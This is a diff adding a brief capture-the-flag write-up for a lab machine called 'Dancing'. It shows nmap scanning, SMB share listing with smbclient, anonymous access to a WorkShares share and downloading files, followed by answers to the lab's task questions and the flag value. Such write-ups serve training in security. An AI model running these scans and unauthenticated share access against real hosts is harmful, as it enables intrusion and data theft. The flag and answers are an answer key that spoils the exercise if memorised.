@@ -1,0 +1,51 @@
+Dancing's Write Up
+
+Commands
+
+ping -c 1 10.129.65.7
+
+sudo nmap --open --min-rate 5000 -sS -sV -vv 10.129.65.7
+port 445 / microsoft_ds
+
+smbclient -L 10.129.65.7
+
+smb \\\\10.129.65.7\\ADMIN$
+smb \\\\10.129.65.7\\C$
+smb \\\\10.129.65.7\\WorkShares
+
+password: 
+
+cd Amy.J
+get worknotes.txt
+cd ../James.P 
+get flag.txt 
+^C 
+
+cat flag.txt
+5f61c10dffbc77a704d76016a22f1664
+
+Tasks
+
+1- What does the 3-letter acronym SMB stand for?
+A: Server Message Block
+
+2- What port does SMB use to operate at?
+A: 445 
+
+3- What is the service name for port 445 that came up in our Nmap scan?
+A: microsoft-ds
+
+4- What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?
+A: -L
+
+5- How many shares are there on Dancing?
+A: 4 
+
+6- What is the name of the share we are able to access in the end with a blank password?
+A: WorkShares 
+
+7- What is the command we can use within the SMB shell to download the files we find?
+A: get 
+
+8- Submit root flag
+A: 5f61c10dffbc77a704d76016a22f1664
